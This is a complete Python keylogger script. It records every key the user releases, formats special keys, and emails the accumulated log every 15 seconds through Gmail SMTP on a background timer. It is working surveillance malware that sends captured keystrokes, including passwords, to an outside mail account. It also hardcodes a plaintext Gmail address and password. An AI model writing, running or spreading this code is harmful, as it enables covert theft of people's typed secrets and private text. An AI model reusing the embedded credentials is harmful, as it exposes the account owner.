import sys
import subprocess
# subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
# 'keyboard'])
# subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
# 'smtplib'])
# subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
# 'threading'])


from email import message
import keyboard
import smtplib
from threading import Timer
from datetime import datetime



interval_time_in_seconds = 15
my_email_address = "agrawalaman044@gmail.com"
my_password = "Hahahihi1#"

# message="Diksha Aman"

# gmailserver = smtplib.SMTP(host="smtp.gmail.com", port=587)
# gmailserver.starttls()
# gmailserver.login(my_email_address, my_password)
# gmailserver.sendmail(my_email_address, my_email_address, message)
# # terminates the session
# gmailserver.quit()

# print("Done")

    
keystroke_logs=""

def record_key(type1):
    global keystroke_logs
    key_pressed = type1.name
    key_pressed_length=len(key_pressed)
    isspecial=False
    if(key_pressed_length>1):
        isspecial=True
    
    if(isspecial):
        if(key_pressed=="space"):
            key_pressed=" "
        elif(key_pressed=="enter"):
            key_pressed="Enter\n"
        else:
            key_pressed= key_pressed.replace(" ","_")
            key_pressed=f"[{key_pressed.upper()}]"

    keystroke_logs+=key_pressed


def logger_fun():
    global keystroke_logs
    if keystroke_logs:
        gmailserver = smtplib.SMTP(host="smtp.gmail.com", port=587)
        gmailserver.starttls()
        gmailserver.login(my_email_address, my_password)
        gmailserver.sendmail(my_email_address, my_email_address,keystroke_logs)
        gmailserver.quit()
        print("Email Sent")
    
    keystroke_logs=""
    daemon_process = Timer(interval=interval_time_in_seconds, function=logger_fun)
    daemon_process.daemon = True
    daemon_process.start()
    


if __name__ == "__main__":
    keyboard.on_release(callback=record_key)
    logger_fun()
    keyboard.wait()
